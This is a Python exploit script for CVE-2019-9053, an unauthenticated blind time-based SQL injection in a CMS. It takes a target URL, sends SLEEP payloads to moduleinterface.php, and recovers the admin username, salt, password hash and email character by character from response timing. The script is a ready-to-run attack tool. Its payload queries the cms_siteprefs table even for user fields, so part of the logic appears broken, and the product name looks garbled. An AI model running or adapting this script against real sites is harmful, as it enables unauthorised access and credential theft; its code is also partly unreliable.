# https://www.exploit-db.com/exploits/46635
# CVE-2019-9053, Unauthenticated blind time-based SQL injection

# Credits to the original author: Daniele Scanu @ Certimeter Group
# Script Improved by: Bjarne Verschorre, https://bjarne.verschorre.be

import argparse
import string
import sys
import httpx

parser = argparse.ArgumentParser(prog='CVE-2019-9053', description='An exploit for "Simple Made" CMS')
parser.add_argument('-u', '--url', help='URL to the target', required=True)

target_url = parser.parse_args().url

DICTIONARY = string.digits + string.ascii_letters + '@._-$'
VULN_URL = f'{target_url}/moduleinterface.php?mact=News,m1_,default,0&m1_idlist='

SLEEP = 1 # Increase this if the connection the target is slow
CLIENT = httpx.Client(base_url=VULN_URL, timeout=SLEEP+1, follow_redirects=True, max_redirects=1)

def extract_data(name:str, column_name:str, and_check:str) -> str:
    '''
    Uses the function arguments in the payload to extract the data.
    Prints out the process and returns the result.
    '''

    result = ''
    ord_result = ''

    print(f'- Extracting {name}:')

    while True:
        for char in DICTIONARY:
            temp_result = result + char
            print(f'\r{temp_result}', end='')
            
            ord_temp_result = ord_result + hex(ord(char))[2:]
            payload = f'a,b,1,5))+AND+(SELECT+SLEEP({SLEEP})+FROM+cms_siteprefs+WHERE+{column_name}+LIKE+0x{ord_temp_result}25+AND+{and_check})+--+'
            
            try:
                CLIENT.get(payload, timeout=SLEEP)

            # If the request times out, the character is correct
            except httpx.ReadTimeout: 
                result = temp_result
                ord_result = ord_temp_result
                break

        else:
            break

    print(f'\r{result} \n') # Trailing space is needed to overwrite the last character
    return result

def main():
    queries = [
        ('username', 'username', 'user_id+LIKE+0x31'),
        ('salt', 'sitepref_value', 'sitepref_name+LIKE+0x736974656d61736b'),
        ('password', 'password', 'user_id+LIKE+0x31'),
        ('email', 'email', 'user_id+LIKE+0x31')
    ]

    for query in queries:
        extract_data(*query)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print()
        sys.exit()
